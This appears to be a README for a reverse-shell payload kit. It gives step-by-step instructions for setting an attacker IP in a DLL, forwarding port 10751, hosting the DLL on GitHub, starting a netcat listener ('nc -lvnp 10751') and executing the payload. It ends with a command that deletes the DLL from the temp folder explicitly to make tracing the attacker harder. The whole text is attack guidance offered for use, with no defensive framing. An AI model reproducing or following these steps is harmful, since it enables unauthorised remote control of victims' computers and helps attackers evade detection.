1) In "shell-reversed.dll" and replace "x.x.x.x" with the public ip address of the server you will be litening for the reverse shell on
2) Make Sure The Server You're listening on has port 10751 forwarded to open internet
3) Host the file "shell-reversed.dll" in a github repo
4) Repalce "<LINK GOES HERE>" with the public link to your hosted file in "Reverse Shell.txt"
5) Run the command "nc -lvnp 10751" on the server you want to listen on
6) Execute The Payload
7) Once The Reverse Shell has been established, run the command "rm $env:TEMP\shell-reversed.dll". This will remove the file helping efforts to trace you down become more difficult.
